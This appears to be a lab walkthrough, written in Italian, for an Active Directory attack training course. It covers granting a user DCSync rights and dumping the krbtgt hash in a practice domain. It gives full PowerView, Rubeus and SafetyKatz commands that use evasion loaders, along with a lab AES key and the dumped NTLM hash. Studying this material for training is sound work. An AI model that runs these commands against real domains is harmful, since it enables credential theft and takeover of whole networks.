# LEARNING OBJECTIVE12

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

1. Check if studentx has Replication (DCSync) rights.
   1. &#x20;If yes, execute the DCSync attack to pull hashes of the krbtgt user.
   2. If no, add the replication rights for the studentx and execute the DCSync\
      attack to pull hashes of the krbtgt user.

### SVOLGIMENTO

Apriamo un prompt semplice ed eseguiamo InviShell e importiamo PowerView per verificare se il nostro utente a permessi DCSync

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
. C:\AD\Tools\PowerView.ps1
```

```powershell
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student460"}
```

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

L'utente non gode di tali privilegi, ma possiamo abilitarli spawnando un prompt con privilegi da Domain Admin, partendo da un prompt amministrativo (run as administrator)

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

Nel nuovo prompt spawnato, usiamo la InviShell (il .bat admin in questo caso), importiamo PowerView e aggiungiamo l'ACL che abilita il DCSync per l'utente student460

```powershell
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
```

```powershell
. C:\AD\Tools\PowerView.ps1
```

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student460 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

A questo punto se rieseguiamo in un prompt semplice il comando Get-DomainObjectACL dovremo vedere in output il nuovo permesso

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
. C:\AD\Tools\PowerView.ps1
```

```powershell
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```

<figure><img src="../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

Ottimo! Ora, il comando sottostante (o qualsiasi strumento simile) può essere utilizzato come student460 per ottenere gli hash dell'utente krbtgt o di qualsiasi altro utente, usando un prompt amministrativo (run as administrator).

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

<figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

### krbtgt NTLM 4e9815869d2090ccfca61c1fe0d23986
